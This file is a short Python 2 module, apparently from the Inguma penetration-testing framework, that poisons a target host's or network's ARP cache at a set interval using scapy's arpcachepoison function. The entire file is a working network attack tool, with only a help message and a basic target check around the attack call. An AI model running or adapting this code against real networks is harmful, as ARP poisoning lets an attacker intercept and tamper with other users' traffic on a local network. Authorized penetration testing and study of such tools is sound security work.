#!/usr/bin/python

##      CArpCachePoison.py
#       
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#       
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

try:
    from scapy.all import get_if_addr, get_working_if, arpcachepoison, conf
    bHasScapy = True
except:
    bHasScapy = False

from lib.core import getMacVendor
from lib.module import CIngumaModule

name = "arppoison"
brief_description = "Poison target's ARP cache"
type = "gather"

globals = ["interval", ]

class CArpCachePoison(CIngumaModule):

    target = ""
    waitTime = 0
    timeout = 2
    wizard = False
    interval = 30
    dict = None
    address = ""

    def help(self):
        print "target = <target host or network>"
        print "interval = <interval>"

    def run(self):
        if self.target == "" or self.target.lower() == "localhost":
            self.gom.echo( "[!] No target (or valid target) selected." )
            return False

        conf.verb = 2
        self.address = get_if_addr(get_working_if())
        self.gom.echo( "[+] Using " + str(self.address) )
        self.gom.echo( "  --> Cache poisoning, interval " + str(self.interval) )
        if user_data['isGui'] == False:
            self.gom.echo( "Press Ctrl+C to cancel" )
        arpcachepoison(self.address, self.target, self.interval)
        return True
    
    def printSummary(self):
        pass


